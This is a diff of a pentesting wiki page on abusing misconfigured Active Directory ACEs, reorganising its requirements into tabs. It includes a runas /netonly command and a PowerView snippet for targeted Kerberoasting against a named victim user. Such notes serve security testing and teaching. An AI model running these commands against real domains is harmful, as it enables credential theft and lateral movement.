@@ -10,24 +10,25 @@ When misconfigured, ACEs can be abused to operate lateral movement or privilege 
 
 ## Practice
 
-{% hint style="info" %}
-The attacker needs to be in control of the object the ACE is set on to abuse it and possibly gain control over what this ACE applies to.
+### Requirements
 
-The following abuses can only be carried out when running commands as the user the ACE is set on. On Windows systems, this can be achieved with the following command.
+The attacker needs to be in control of the object the ACE is set on to abuse it and possibly gain control over what this ACE applies to. The following abuses can only be carried out when running commands as the user the ACE is set on.
+
+{% tabs %}
+{% tab title="RunAs" %}
+RunAs is a standard command that allows to execute a program under a different user account. When stuffing an Active Directory account's password, the `/netonly` flag must be set to indicate the credentials are to be used for remote access only.
 
 ```bash
-runas /netonly /user:$DOMAIN\$USER
+runas /netonly /user:$DOMAIN\$USER "powershell.exe"
 ```
 
-All abuses below can be carried out on a Windows system \(the system doesn't even have to be enrolled in the domain\). 
+Since the password cannot be supplied as an argument, the session must be interactive.
+{% endtab %}
 
-On UNIX-like systems, a few of the following abuses can be carried out. The [aclpwn](https://github.com/fox-it/aclpwn.py) could maybe do the job in most cases. Personally, I always encountered errors and unsupported operations when trying to use it but I will probably do some further tests to include it here.
-{% endhint %}
-
-{% hint style="success" %}
+{% tab title="PowerView" %}
 Most of [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)'s functions have the `-Credential`, `-Domain` and `-Server` parameters that can be used to explicitly specify the user to run as, the target Domain and and the target Domain Controller. This can be useful when trying to this from a Windows system that isn't enrolled in the AD domain.
 
-Here is an example with targeted Kerberoasting \(see [`GenericAll`](./#genericall), [`GenericWrite`](./#genericwrite)\).
+Here is an example for [targeted Kerberoasting](targeted-kerberoasting.md).
 
 ```bash
 $SecPassword = ConvertTo-SecureString 'pasword_of_user_to_run_as' -AsPlainText -Force
@@ -36,11 +37,18 @@ Set-DomainObject -Credential $Cred -Domain 'FQDN.DOMAIN' -Server 'Domain_Control
 $User = Get-DomainUser -Credential $Cred -Domain 'FQDN.DOMAIN' -Server 'Domain_Controller' 'victimuser'
 $User | Get-DomainSPNTicket -Credential $Cred -Domain 'FQDN.DOMAIN' -Server 'Domain_Controller' | fl
 ```
+{% endtab %}
+{% endtabs %}
+
+{% hint style="info" %}
+**Windows or UNIX ?**
+
+All abuses below can be carried out on a Windows system that doesn't even have to be joined to the domain. On UNIX-like systems, a few of the following abuses can be carried out with tools like [aclpwn](https://github.com/fox-it/aclpwn.py) and [ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py). I personally find it way easier to abuse ACEs from a Windows machine.
 {% endhint %}
 
 ### Exploitation paths
 
-In order to navigate the notes, you can use the following mindmap
+In order to navigate the notes, testers can use the mindmap below.
 
 ![](../../../.gitbook/assets/abusing-aces.png)
 
